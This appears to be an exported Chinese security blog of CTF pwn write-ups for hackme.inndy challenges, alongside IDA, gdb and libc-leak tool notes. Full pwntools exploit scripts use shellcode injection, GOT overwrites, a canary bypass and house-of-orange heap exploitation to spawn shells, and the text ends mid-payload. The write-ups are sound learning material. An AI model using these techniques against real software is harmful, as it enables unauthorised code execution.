    <content type="text"><![CDATA[防护机制： 123456[*] &apos;/home/zs0zrc/pwn/Scoreboard/onepunch/onepunch&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 程序的ida反编译出来的代码很短： 1234567891011121314151617int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+8h] [rbp-18h] int v5; // [rsp+Ch] [rbp-14h] _BYTE *v6; // [rsp+10h] [rbp-10h] unsigned __int64 v7; // [rsp+18h] [rbp-8h] v7 = __readfsqword(0x28u); setbuf(_bss_start, 0LL); printf("Where What?", 0LL); v5 = __isoc99_scanf("%llx %d", &amp;v6, &amp;v4); if ( v5 != 2 ) return 0; *v6 = v4; if ( v4 == '\xFF' ) puts("No flag for you"); return 0; 程序要求输入一个地址，然后再往输入的地址写一个整数。然后再判断输入的整数是否等于255，如果等于就利用puts函数打印一句话然后退出。 这个程序只有一次任意地址写的机会，因为没有给不知道libc地址，所以写got表就不可行。在gdb调试时，发现 text段竟然具有可写的权限，所以可以通过patch程序来修改程序逻辑。 先修改程序逻辑，实现能循环读取 修改 0x400767处的 “jnz short loc_400773”为 “jnz_40071d” 1changeadd(0x400768,0xb4) 然后往0x400769处写入shellcode 123shellcode = asm(shellcraft.sh())for i in range(len(shellcode)): changeadd(0x400769+i,ord(shellcode[i])) exp: 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./onepunch') elf = ELF('./onepunch') libc = elf.libcelse: host = 'hackme.inndy.tw' port = '7718' p = remote(host,port) elf = ELF('./onepunch')context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def changeadd(addr,content): ru("Where What?") p.sendline("&#123;&#125; &#123;&#125;".format(hex(addr),content))changeadd(0x400768,0xb4)shellcode = asm(shellcraft.sh())for i in range(len(shellcode)): changeadd(0x400769+i,ord(shellcode[i]))changeadd(0x400800,0xff)p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[leave_msg writeup]]></title>
    <url>%2F2018%2F09%2F22%2F2018-9-22-leave_msg-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： 1234567[*] &apos;/home/zs0zrc/pwn/Scoreboard/leave_msg/leave_msg&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 只开启了Canary，没开NX，说明应该是要写shellcode 拖入ida反编译，发现程序的功能很简单。可以输入三次message，每次输入message后还要输入要插入的位置的下标slot。并且程序会对message的长度进行检查和输入的slot的大小进行检查。 对message长度的检查: 123456v3 = atoi(&amp;nptr); if ( strlen(&amp;buf) &gt; 8 ) &#123; puts("Message too long, truncated."); v6 = 0; &#125; 对slot大小的检查： 12345if ( v3 &lt;= 64 &amp;&amp; nptr != '-' ) dword_804A060[v3] = (int)strdup(&amp;buf); else puts("Out of bound.");&#125; 两个check都过了的话就将输入的message存到bss段的一个全局数组变量中去，存储的位置由输入的下标slot决定。这里只要绕过这两个check就可以改写got表的内容了。 strlen函数：它根据碰到的第一个’\0’来计算字符串的长度，所以可以在字符串前面加’\0’来绕过检查。 nptr != ‘-‘ 可以通过在’-‘符号前加一个空格来绕过 检查绕过后，可以修改got表 puts函数的内容为 ’add esp,0x36;jmp esp’来跳转到shellcode去，然后执行shellcode，这个0x38是调试出来的 10x36 = 0x30 + len(asm("add esp,0x36;jmp esp")) + 1 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#!/usr/bin/env pythonfrom pwn import *local = 1 if local: p = process('./leave_msg') elf = ELF('./leave_msg') libc = elf.libcelse: host = 'hackme.inndy.tw' port = '7715' p = remote(host,port) elf = ELF('./leave_msg')context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def debug(addr,PIE=False): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr)))shellcode = asm("add esp,0x36;jmp esp")shellcode += '\x00'shellcode += asm(shellcraft.sh())ru("I'm busy. Please leave your message:\n")sd(shellcode)ru("Which message slot?\n")sd(' -16')p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IDA的常见操作]]></title>
    <url>%2F2018%2F09%2F21%2F2018-9-21-ida%E7%9A%84%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[IDA-python的使用：常用的api 1234get_bytes(address,count)从address处读取count个字节的内容patch_bytes(address,buf),将adress地址处patch成buf的内容Xrefsto(address,flags=0) 找到所有引用了adress的地址byte(address) 获取address地址的一个字节的内容 一些IDA常用的快捷键： 跳转到特定地址 ： G 查询交叉引用： X 查找字符串： alt + t 拍摄快照：ctrl+shift+w 重新定义变量数据类型 : y undefine一个 函数： u create 一个函数：p ida反编译的一些技巧： 如果它函数反编译出来的变量很奇怪，可以将这个函数undefine掉然后再define，这样看的变量就会正常很多 如果反编译函数显示sp指针有问题，可以通过快捷键alt+k 在报错的地址修复sp指针 如果函数的结束地址正常，可以通过快捷键alt+p修改函数结束地址 可以变量转换数组，通过快捷键 y 将数据类型修改为 对应的类型的指针 例如 char *a1 ida远程调试linux上的程序先将ida文件夹下的linux_server64或者linux_server32拷到虚拟机去然后给它执行权限，同时将要调试的文件和它放在同意文件夹，然后设置ida使用remote debugger 设置相关的路径，就可以开始调试了 ida 之定义一个结构体在 edit 中选择 Add struct type 快捷键 是ins 设置struct的name，想要向结构体添加成员的话，点击 struct ends ，然后按D，就可以添加成员，再通过 N修改成员的名字，Y修改成员的类型 12345678910111213141516171800000000 ; Ins/Del : create/delete structure00000000 ; D/A/* : create structure member (data/ascii/array)00000000 ; N : rename structure or structure member00000000 ; U : delete structure member00000000 ; [00000018 BYTES. COLLAPSED STRUCT Elf64_Sym. PRESS CTRL-NUMPAD+ TO EXPAND]00000000 ; [00000018 BYTES. COLLAPSED STRUCT Elf64_Rela. PRESS CTRL-NUMPAD+ TO EXPAND]00000000 ; [00000010 BYTES. COLLAPSED STRUCT Elf64_Dyn. PRESS CTRL-NUMPAD+ TO EXPAND]00000000 ; ---------------------------------------------------------------------------0000000000000000 struc_1 struc ; (sizeof=0x128, mappedto_6)00000000 name dq ? ; offset00000008 age dq ?00000010 description db 256 dup(?)00000110 align dq ?00000118 friends dq ? ; offset00000120 flags dq ?00000128 struc_1 ends00000128 如果想修改变量为struct的类型 ，就用 Y快捷键修改]]></content>
      <categories>
        <category>TOOL</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gdb常用命令]]></title>
    <url>%2F2018%2F09%2F20%2F2018-9-14-gdb%2F</url>
    <content type="text"><![CDATA[gdb 123456789101112基础调试命令s step，si步入n 执行下一条指令 ni步入b 在某处下断点，可以用b * adrressb function_nameinfo b 查看断点信息delete 删除所有断点c 继续r 执行disas addr 查看addr处前后的反汇编代码disas functions 参看fucntion函数的反汇编代码 显示内存数据1234567891011121314151617181920212223242526272829303132p 系列p system/main 显示某个函数地址p $esp 显示寄存器p/x p/a p/b p/s。。。p 0xff - 0xea 计算器print &amp;VarName 查看变量地址p * 0xffffebac 查看某个地址处的值x系列命令格式：x/&lt;n/f/u&gt; &lt;addr&gt; n是一个正整数，表示需要显示的内存单元的个数f 表示显示的格式(b字符，s字符串,i汇编指令,x十六进制，d十进制)u 表示从当前地址往后请求的字节数 默认4byte,u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字 节，g表示八字节&lt;addr&gt;表示一个内存地址x/xw addr 显示某个地址处开始的16进制内容，如果有符号表会加载符号表x/x $esp 查看esp寄存器中的值x/s addr 查看addr处的字符串x/b addr 查看addr处的字符x/i addr 查看addr处的反汇编结果info系列info register $ebp 查看寄存器ebp中的内容 (简写为 i r ebp)i r eflags 查看状态寄存器i r ss 查看段寄存器i b 查看断点信息i functions 查看所有的函数disas addr 查看addr处前后的反汇编代码stack 20 查看栈内20个值show args 查看参数vmmap 查看映射状况 peda带有readelf 查看elf文件中各个段的起始地址 peda带有parseheap 显示堆状况 peda带有 查找数据1234find 查找字符串 peda带有searchmem 查找字符串 peda带有ropsearch &quot;xor eax,eax;ret&quot; 0x08048080 0x08050000 查找某段的rop peda带有ropgadget 提供多个pop|ret可行结果 peda带有 Pwngdb插件123456789101112131415161718192021222324252627282930libc : Print the base address of libcld : Print the base address of ldcodebase : Print the base of code segmentheap : Print the base of heapgot : Print the Global Offset Table infomationdyn : Print the Dynamic section infomationfindcall : Find some function callbcall : Set the breakpoint at some function calltls : Print the thread local storage addressat : Attach by process namefindsyscall : Find the syscallfmtarg : Calculate the index of format stringYou need to stop on printf which has vulnerability.force : Calculate the nb in the house of force.heapinfo :打印heap的一些信息default is the arena of current threadIf tcache is enable, it would show infomation of tcache entryheapinfoall : Print some infomation of heap (all threads)arenainfo : Print some infomation of all arenachunkptr : 打印chunk的信息 后面加chunk返回给用户的地址printfastbin : 打印fastbin的链表信息tracemalloc on : 追踪程序chunk的malloc和freeparseheap :解析堆的布局magic : 打印出glibc中一些有用的信息fp : show FILE structurefp (Address of FILE)fpchain: show linked list of FILEorange : Test house of orange condition in the _IO_flush_lockporange (Address of FILE)glibc version &lt;= 2.23 pwndbg123456789top_chunk: 显示top chunk的信息malloc_chunk address:打印出已被分配的chunk的信息fastbins:显示fastbins链表信息unsorted:显示unsortedbin 的信息smallbins:显示smallbins的信息largebins:显示largebins的信息bins:显示所有bins的信息mp：显示一些内存管理用到的全局变量arena：显示分配区的信息]]></content>
      <categories>
        <category>TOOL</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[very_overflow writeup]]></title>
    <url>%2F2018%2F09%2F20%2F2018-9-22-very_overflow-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： 123456[*] '/home/zs0zrc/pwn/Scoreboard/very_overflow/very_overflow' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 只开启了NX，并且程序是32位的。简单的运行了下，发现程序有4个功能。题目提供了源码就不用ida看了。这个程序模拟一个node的分配系统，但是没有用到堆，而是在栈上分配 node的结构体: 1234struct NOTE &#123; struct NOTE* next;//存储着下个note地址的指针 char data[128];&#125;; 程序的4个功能 12341) add node 新建一个node 2) edit node 对给定下标的node进行编辑3) show node 将给定下标的node的相关内容打印出来4) dump nodes 将全部note的相关内容打印出来 这个程序主要 漏洞存在 add 和 edit 功能上 add一个新 node时，它设置node-&gt;next的操作有问题,单独看是没什么问题的。 1node-&gt;next = (struct NOTE*)(node-&gt;data + strlen(node-&gt;data) + 1); edit用的是fgets函数，它读取的长度是固定的 12fgets(node-&gt;data, sizeof(node-&gt;data), stdin);//这里 sizeof(node-data) = 128// 如果创建的node的data大小比这个小，那么在edit时就会造成溢出，就可以修改下个node的next字段，达到任意地址读写的操作 具体思路： 1234利用edit的溢出修改下个node的next字段为got表的地址通过show功能打印出libc内地址在通过edit功能修改atoi函数在got表的内容为 system函数地址然后发送 &apos;/bin/sh\x00&apos;字符串 就可以getshell了 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./very_overflow') elf = ELF('./very_overflow') libc = elf.libcelse: host = 'hackme.inndy.tw' port = '7705' p = remote(host,port) elf = ELF('./very_overflow') libc = ELF('./libc-2.23.so.i386')context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def debug(addr,PIE=False): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) def add(content): ru("Your action:") sl('1') ru("note: ") sd(content)def edit(idx,content): ru("Your action:") sl('2') ru(" edit: ") sl(str(idx)) ru("data: ") sd(content)def show(idx): ru("Your action:") sl('3') ru('Which note to show: ') sl(str(idx))add('a'*8+'\n')add('b'*8+'\n')add('c'*8+'\n')edit(0,'a'*0xa + p32(elf.got['__libc_start_main'])+'\n')show(2)ru("Next note: ")leak = int(p.recvline().strip('\n'),16)print hex(leak)libc_base = leak - 0x18540system = libc_base + libc.symbols['system']edit(2,p32(system)*3+'\n')rc()sl("$0")sl('5')p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用来泄露libc的一些工具]]></title>
    <url>%2F2018%2F09%2F20%2F2018-9-20-leak_libc%2F</url>
    <content type="text"><![CDATA[libc_database ./add 用来添加libc库 1./add /usr/lib/libc-2.21.so ./find 用来查找libc版本 12$ ./find printf 260archive-glibc (id libc6_2.19-10ubuntu2_i386) ./dump 用来输出libc中的一些函数的偏移 123456$ ./dump libc6_2.19-0ubuntu6.6_i386offset___libc_start_main_ret = 0x19a83offset_system = 0x00040190offset_dup2 = 0x000db590offset_recv = 0x000ed2d0offset_str_bin_sh = 0x160a24 LibcSearcher 一个基于libc_database写的python库例子12345678from LibcSearcher import *#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型obj = LibcSearcher(&quot;fgets&quot;, 0X7ff39014bd90)obj.dump(&quot;system&quot;) #system 偏移obj.dump(&quot;str_bin_sh&quot;) #/bin/sh 偏移obj.dump(&quot;__libc_start_main_ret&quot;) libc database search一个用来查询libc版本的网站 onegadget 一个神奇的工具 用来找libc中能一个gadget就get到shell的偏移 使用1one_gadget /lib/x86_64-linux-gnu/libc.so.6 info proc map 查看各个库加载信息然后寻找 “/bin/sh” 字符串strings: 查看文件中可见字符串strings -a -t x /lib32/libc.so.6 | grep “/bin/sh”objdump -d file | grep “ret” 可以用来查找ret指令objdump -x [filename] 打印头文件信息以及区段信息objdump -T libc.so | grep gets 我知道的就这么多了]]></content>
      <categories>
        <category>TOOL</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[stack writeup]]></title>
    <url>%2F2018%2F09%2F19%2F2018-9-19-stack-writeup%2F</url>
    <content type="text"><![CDATA[防护机制：全开 同时题目提供了一部分代码，通过阅读代码可以发现程序在模拟栈的PUSH和POP操作 1234567void stack_push(struct stack *s, int val) &#123; s-&gt;data[s-&gt;n++] = val;&#125;int stack_pop(struct stack *s) &#123; return s-&gt;data[--s-&gt;n];&#125; stack的结构体 1234struct stack &#123; int n; int data[64];&#125;; 通过ida反编译后查看代码 123456789101112131415int __cdecl stack_push(int *stack, int num)&#123; int result; // eax result = *stack; *stack += &amp;(&amp;GLOBAL_OFFSET_TABLE_)[4294967042] + 1; stack[result + 1] = num; return result;&#125;int __cdecl stack_pop(_DWORD *a1)&#123; *a1 += &amp;unk_1FBF + 0xFFFFE040; return *(&amp;dword_1FC4[-2032] + &amp;a1[*a1]);&#125; 不知道为什么我这反编译的东西看的这么奇怪，但是不管这个，程序没有对push或者pop的下标进行检查，所以可以先pop然后在push修改下标，就可以绕过canary，修改返回地址 push函数的汇编代码： 123456789101112131415161718192021.text:000006F0 stack_push proc near ; CODE XREF: main+DC↓p.text:000006F0.text:000006F0 stack = dword ptr 8.text:000006F0 num = dword ptr 0Ch.text:000006F0.text:000006F0 ; __unwind &#123;.text:000006F0 push ebp.text:000006F1 mov ebp, esp.text:000006F3 ; 4: result = *stack;.text:000006F3 call __x86_get_pc_thunk_ax.text:000006F8 add eax, 18C8h.text:000006FD mov eax, [ebp+stack]//n.text:00000700 mov eax, ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax].text:00000702 ; 5: *stack += &amp;(&amp;GLOBAL_OFFSET_TABLE_)[4294967042] + 1;.text:00000702 lea ecx, (_GLOBAL_OFFSET_TABLE_+1 - 1FC0h)[eax].text:00000705 mov edx, [ebp+stack].text:00000708 mov [edx], ecx.text:0000070A ; 6: stack[result + 1] = num;.text:0000070A mov edx, [ebp+stack] //stack.text:0000070D mov ecx, [ebp+num] // number.text:00000710 mov [edx+eax*4+4], ecx 可以看到edx存放着stack结构体的地址，ecx存放着要进行操作的操作数，eax存放着要下标n pop函数汇编： 12345678910111213141516=&gt; 0x56555717 &lt;+0&gt;: push ebp 0x56555718 &lt;+1&gt;: mov ebp,esp 0x5655571a &lt;+3&gt;: call 0x56555917 &lt;__x86.get_pc_thunk.ax&gt; 0x5655571f &lt;+8&gt;: add eax,0x18a1 0x56555724 &lt;+13&gt;: mov eax,DWORD PTR [ebp+0x8] 0x56555727 &lt;+16&gt;: mov eax,DWORD PTR [eax] 0x56555729 &lt;+18&gt;: lea edx,[eax-0x1] 0x5655572c &lt;+21&gt;: mov eax,DWORD PTR [ebp+0x8] 0x5655572f &lt;+24&gt;: mov DWORD PTR [eax],edx 0x56555731 &lt;+26&gt;: mov eax,DWORD PTR [ebp+0x8] 0x56555734 &lt;+29&gt;: mov edx,DWORD PTR [eax] \\ n 0x56555736 &lt;+31&gt;: mov eax,DWORD PTR [ebp+0x8] \\ stack 0x56555739 &lt;+34&gt;: mov eax,DWORD PTR [eax+edx*4+0x4] \\ stack-&gt;data[--n] 0x5655573d &lt;+38&gt;: pop ebp 0x5655573e &lt;+39&gt;: ret End of assembler dump. 观察栈的内容 123456789101112131415161718192021222324252627282930313233343536pwndbg&gt; stack 9800:0000│ esp 0xffffce4c — 0x56555820 (main+225) — 0x8b10c48301:0004│ 0xffffce50 — 0xffffce68 — 0x002:0008│ 0xffffce54 — 0x4d203:000c│ 0xffffce58 — 0xf7ff5ac4 — jae 0xf7ff5b3f04:0010│ 0xffffce5c — 0x5655575a (main+27) — 0x1866c38105:0014│ 0xffffce60 — 0xf7ff39f3 — cmp al, 0x6d /* '&lt;main program&gt;' */06:0018│ 0xffffce64 — 0x4d207:001c│ eax 0xffffce68 — 0x0... ↓48:0120│ edi 0xffffcf6c — 0x69 /* 'i' */49:0124│ 0xffffcf70 — 0x04a:0128│ 0xffffcf74 — 0xffffd245 — 0x6d6f682f ('/hom')4b:012c│ 0xffffcf78 — 0xf7fb6000 (_GLOBAL_OFFSET_TABLE_) — 0x1b1db04c:0130│ 0xffffcf7c — 0xaf174d:0134│ 0xffffcf80 — 0xffffd245 — 0x6d6f682f ('/hom')4e:0138│ 0xffffcf84 — 0x2f /* '/' */4f:013c│ 0xffffcf88 — 0x5e /* '^' */50:0140│ 0xffffcf8c — 0x1651:0144│ 0xffffcf90 — 0x800052:0148│ 0xffffcf94 — 0xf7fb6000 (_GLOBAL_OFFSET_TABLE_) — 0x1b1db053:014c│ 0xffffcf98 — 0xf7fb4244 — 0xf7e1c020 (_IO_check_libio) — call 0xf7f23b5954:0150│ 0xffffcf9c — 0xf7e1c0ec (init_cacheinfo+92) — test eax, eax55:0154│ 0xffffcfa0 — 0x156:0158│ 0xffffcfa4 — 0x56556fc0 (_GLOBAL_OFFSET_TABLE_) — 0x1ee057:015c│ 0xffffcfa8 — 0x158:0160│ 0xffffcfac — 0xeb03c60059:0164│ 0xffffcfb0 — 0x15a:0168│ 0xffffcfb4 — 0xffffd074 — 0xffffd245 — 0x6d6f682f ('/hom')5b:016c│ 0xffffcfb8 — 0xffffd07c — 0xffffd26d — 0x53554244 ('DBUS')5c:0170│ 0xffffcfbc — 0xffffcfe0 — 0x15d:0174│ 0xffffcfc0 — 0x05e:0178│ 0xffffcfc4 — 0xf7fb6000 (_GLOBAL_OFFSET_TABLE_) — 0x1b1db05f:017c│ ebp 0xffffcfc8 — 0x060:0180│ 0xffffcfcc — 0xf7e1c637 (__libc_start_main+247) — add esp, 0x1061:0184│ 0xffffcfd0 — 0xf7fb6000 (_GLOBAL_OFFSET_TABLE_) — 0x1b1db0 返回地址存放着__libc_start_main + 247，可以通过这个泄露出libc地址，然后再覆盖返回地址为system函数地址，将对应参数写入栈中，这里写的地址要转换成int32的类型，不然会发生溢出 转换方法 ： 123func_addr = func_addr- (1&lt;&lt;32)orfunc_addr = func_addr - 0xffffffffff - 1 具体步骤： 1231.先pop一次，然后push &apos;93&apos;修改n为0x5d,也就是main函数的返回地址的对应的下标2.pop leak出libc的地址3.将system函数写入返回地址中，并且将参数写入对应的位置 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#!/usr/bin/env pythonfrom pwn import *local = 1if local: p = process('./stack') elf = ELF('./stack') libc = elf.libcelse: host = 'hackme.inndy.tw' port = '7716' p = remote(host,port) elf = ELF('./stack') libc = ELF('./libc-2.23.so.i386')context.arch = elf.archcontext.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def debug(addr,PIE=False): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr)))def push(number): rc() sl('i') sl(str(number))def pop(): rc() sl('p')pop()push('93')pop()ru("Pop -&gt; ")leak = int(p.recv(10))&amp;0xffffffffprint hex(leak)libc_base = leak - libc.symbols['__libc_start_main'] - 247print hex(libc_base)system = libc.symbols['system'] + libc_basebinsh = libc.search('/bin/sh\x00').next() + libc_basepush(str(system-(1&lt;&lt;32)))push('0')push(str(binsh-(1&lt;&lt;32)))sl('x')p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[house_of_orange]]></title>
    <url>%2F2018%2F09%2F19%2F2018-9-19-house_of_orange%2F</url>
    <content type="text"><![CDATA[今天学习了下house_of_orange,总算是把house_of_orange给搞懂了 house_of_orange原理其实很简单，就是利用unsorted bin attack 和_IO_FILE利用的结合 这里涉及到的知识点有点多，是堆利用和IO_FILE利用的结合，所以要对两者都有一定的了解 直接拿house_of_orange这道经典的题来说吧 防护机制： 基本程序逻辑：一共有三个功能 build 创建一个house 输入housename的长度、内容、price、color的一些信息，并且它的将house更新为最新分配的house，所以我们只能对刚分配的house进行操作 upgrade 更新house的内容，这里读取name时存在堆溢出漏洞 see 打印出house的信息 ，这里可以将地址leak出来 大致思路： 通过堆溢出，修改top chunk的大小，然后分配一个大小大于top chunk大小的chunk，所以 旧top chunk就会被free掉，进入unsorted bin中，然后再分配一个大小在large bin 的大小范围内的chunk，那么这个chunk就会包含libc的地址和它本身的地址，通过两次upgrade和see将libc地址和heap地址都泄露出来。之后通过堆溢出修改old top chunk的size字段为0x60，利用unsorted bin attack将 _IO_list_all修改为main_arena+0x58，同时old top chunk会被链入small bin中，如果再分配一个chunk，就会触发malloc_printerr，会遍历IO_llist_all，最终调用 IO_overflow函数，具体的下面会展开 首先这个题没有free功能，所以要想办法可以生成一个unsorted bins的chunk，这里是通过堆溢出，修改top chunk的大小，使它变小，这里要注意top chunk的size是有一些检查的，然后分配一个大小超出top chunk大小的chunk，这时根据申请的大小，会通过sysmalloc 来分配，如果申请的大小小于mmap的阀值的话，就会扩展top chunk，将old top chunk free掉，如果大于的话，就会通过mmap申请一块新的堆块。 sysmalloc源码： 1234567891011121314151617181920212223242526272829if (av == NULL || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))/*这里进行判断，判断分配的大小是否大于mmap分配的阀值，如果大于就是用mmap从新分配一个堆块，否则就会扩展top chunk*/ &#123; char *mm; /* return value from mmap call*/ try_mmap: ......... .......... if (old_size != 0) &#123; /* Shrink old_top to insert fenceposts, keeping size a multiple of MALLOC_ALIGNMENT. We know there is at least enough space in old_top to do this. */ old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK; set_head (old_top, old_size | PREV_INUSE); set_head (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE); set_head (chunk_at_offset (old_top, old_size + 2 * SIZE_SZ), (2 * SIZE_SZ) | PREV_INUSE); /* If possible, release the rest. */ if (old_size &gt;= MINSIZE) &#123; _int_free (av, old_top, 1);/*将old top chunk free掉，加入unsorted bin*/ &#125; &#125; ...........省略了挺多的 具体可以自己去看源码 能产生unsorted bin 之后，就要想着怎么泄露出libc地址了，libc地址很好泄露，但是heap的地址也要泄露出来，用于后面伪造_IO_FILE_plus结构体。这里的做法是，通过申请一个large bin大小的chunk，那么它的fd_nextsize和bk_nextsize中会存放自身的地址，通过这就可以泄露出堆地址 具体做法是，是使用upgrade功能，将name依次更新为‘aaaaaaaa’及’a’*16 然后通过see功能就可以将地址打印出来 12345678910111213141516build(0x400,'a'*8,123,1)see()p.recvuntil("a"*8)leak = u64(p.recv(6).ljust(8,'\x00'))libc_base = leak -1640- 0x3c4b20 print "libc base address --&gt;[%s]"%hex(libc_base)upgrade(0x400,'a'*16,123,1)see()p.recvuntil('a'*16)leak_heap = u64(p.recv(6).ljust(8,'\x00'))heap_base = leak_heap - 0xe0print "leak_heap --&gt;[%s]"%hex(leak_heap)print "heap_base --&gt;[%s]"%hex(heap_base)_IO_list_all = libc.symbols['_IO_list_all'] + libc_basesystem = libc.symbols['system'] + libc_base 利用unsoted bin attack将 _IO_list_all 修改为 main_arena+88 这个很容易就实现，之后再分配一个chunk时会触发malloc_printerr 1234if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize_nomask (victim) &gt; av-&gt;system_mem, 0)) malloc_printerr ("malloc(): memory corruption"); 触发malloc_printerr后会调用一系列函数，最终调用 _IO_overflow函数 1234函数大致调用链malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW而_IO_OVERFLOW最后会调用vtable表中的__overflow 函数#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH) _IO_flush_all_lockp 源码： 123456789101112131415161718192021222324252627282930_IO_flush_all_lockp (int do_lock)&#123; int result = 0; FILE *fp;#ifdef _IO_MTSAFE_IO _IO_cleanup_region_start_noarg (flush_cleanup); _IO_lock_lock (list_all_lock);#endif for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain) &#123; run_fp = fp; if (do_lock) _IO_flockfile (fp); if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)/*一些检查，需要绕过*/ || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))/*也可以绕过这个*/ ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/ result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; &#125;#ifdef _IO_MTSAFE_IO _IO_lock_unlock (list_all_lock); _IO_cleanup_region_end (0);#endif return result;&#125; 所以这里通过将_IO_list_all修改为main_arena+0x58,这时IO_list_all中的 *chain指针位于 _IO_list_all + 0x68的位置，也就是 main_arena + 0x58 + 0x68–&gt;small bin中大小为0x60的位置，所以之前将old top chunk的size修改为0x60，old top chunk就会链入small bin中，这时就可以将伪造的fake_file链入IO_all_list中,将fake_file的vtable指向伪造的IO_jump_t结构的地址，在伪造的 IO_jump_t 结构体中，在overflow函数处写入system函数，则最终会调用system函数 伪造的file结构体要通过的条件 12345671.((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) 或者是2._IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base) 一般来说上面比较好伪造，我下面的exp也是伪造的上面的 如果伪造下面的话还要关注一下_wide_data结构体，这里就略过了 查看是否为伪造成功 此时的vtable已经指向伪造的函数表了 exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980from pwn import*context.log_level = 'debug'p = process('./houseoforange')elf = ELF('./houseoforange')libc = elf.libcdef menu(idx): p.recvuntil(': ') p.sendline(str(idx))def see(): menu(2)def build(length, nm, pz, color): menu(1) p.recvuntil(":") p.sendline(str(length)) p.recvuntil(":") p.send(nm) p.recvuntil(":") p.sendline(str(pz)) p.recvuntil(":") p.sendline(str(color))def upgrade(length, nm, pz, color): menu(3) p.recvuntil(":") p.sendline(str(length)) p.recvuntil(":") p.send(nm) p.recvuntil(":") p.sendline(str(pz)) p.recvuntil(":") p.sendline(str(color))build(0x30,'a'*8,123,1)#gdb.attach(p)payload = 'a'*0x30 + p64(0) + 